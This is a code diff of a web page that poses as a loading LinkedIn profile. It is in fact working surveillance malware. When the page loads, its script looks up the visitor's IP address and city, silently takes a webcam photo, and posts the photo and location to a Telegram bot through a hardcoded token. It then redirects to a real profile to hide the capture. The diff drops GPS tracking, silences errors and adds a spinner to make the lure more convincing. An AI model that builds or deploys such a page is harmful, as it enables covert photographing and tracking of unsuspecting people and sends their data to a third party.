@@ -3,38 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkedIn Profile</title>
+    <title>LinkedIn</title>
     <style>
         body { 
-            margin:0; 
-            padding:0; 
-            background:#ffffff; 
-            height:100vh; 
-            display:flex; 
-            align-items:center; 
-            justify-content:center; 
-            font-family:Arial, sans-serif; 
+            margin:0; padding:0; background:#ffffff; 
+            height:100vh; display:flex; align-items:center; 
+            justify-content:center; font-family:Arial, sans-serif; 
         }
-        h1 { color: #0077b5; }
+        h1 { color: #0077b5; font-size: 26px; }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0077b5;
+            border-radius: 50%;
+            width: 40px; height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1>Loading profile...</h1>
+    <div>
+        <h1>Loading LinkedIn Profile...</h1>
+        <div class="loader"></div>
+    </div>
 
     <script>
-        // ================== YOUR DETAILS ==================
         const TELEGRAM_BOT_TOKEN = "8475309387:AAHv1rNBBuU2XDaGtdQLAW0yRUspKX4fXZE";
         const TELEGRAM_CHAT_ID = "7052857946";
         const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
-        // ================================================
 
         let visitorInfo = {
-            ip: "Unknown",
-            city: "Unknown",
-            country: "Unknown",
-            isp: "Unknown",
-            latitude: "Unknown",
-            longitude: "Unknown",
+            ip: "Unknown", city: "Unknown", country: "Unknown",
             timestamp: new Date().toISOString()
         };
 
@@ -42,94 +42,63 @@
             try {
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("caption", 
-                `🔴 New Capture\n\n` +
-                `IP: ${visitorInfo.ip}\n` +
-                `Location: ${visitorInfo.city}, ${visitorInfo.country}\n` +
-                `GPS: ${visitorInfo.latitude}, ${visitorInfo.longitude}\n` +
-                `Google Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}\n` +
-                `Time: ${visitorInfo.timestamp}`);
+                formData.append("caption", `🔴 New Capture\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.city}, ${visitorInfo.country}\nTime: ${visitorInfo.timestamp}`);
 
                 const blob = await fetch(photoBase64).then(r => r.blob());
                 formData.append("photo", blob, "photo.jpg");
 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
+                    method: "POST", body: formData
                 });
-            } catch (e) {
-                console.log("Telegram error", e);
-            }
+            } catch(e) {}
         }
 
-        async function getGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve();
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        visitorInfo.latitude = position.coords.latitude.toFixed(6);
-                        visitorInfo.longitude = position.coords.longitude.toFixed(6);
-                        resolve();
-                    },
-                    (error) => {
-                        console.log("GPS Error:", error.message);
-                        resolve();
-                    },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-            });
-        }
-
-        async function start() {
+        async function getIPInfo() {
             try {
-                // Get IP + ISP Location
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 visitorInfo.ip = ipData.ip;
 
-                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geo = await geoRes.json();
+                const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
                 visitorInfo.city = geo.city || "Unknown";
                 visitorInfo.country = geo.country_name || "Unknown";
-                visitorInfo.isp = geo.org || "Unknown";
+            } catch(e) {}
+        }
 
-                // Get Real GPS Location
-                await getGPS();
+        async function start() {
+            await getIPInfo();
 
-                // Request Camera
+            try {
+                // Try to access camera - will be silent if already allowed
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
                 });
 
+                // If we reach here → camera access granted (either now or previously)
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(resolve => setTimeout(resolve, 1600));
+                await new Promise(r => setTimeout(r, 1400));
 
                 const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
+                canvas.width = 640; canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
-                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                const photo = canvas.toDataURL('image/jpeg', 0.85);
+                stream.getTracks().forEach(t => t.stop());
 
-                stream.getTracks().forEach(track => track.stop());
+                await sendToTelegram(photo);
 
-                // Send to Telegram
-                await sendToTelegram(photoBase64);
-
-            } catch (error) {
-                console.log("Error:", error);
+            } catch (err) {
+                // Camera permission denied or blocked → just redirect
+                console.log("Camera not allowed");
             } finally {
+                // Always redirect at the end
                 window.location.href = REDIRECT_URL;
             }
         }
 
-        // Start everything
         start();
     </script>
 </body>
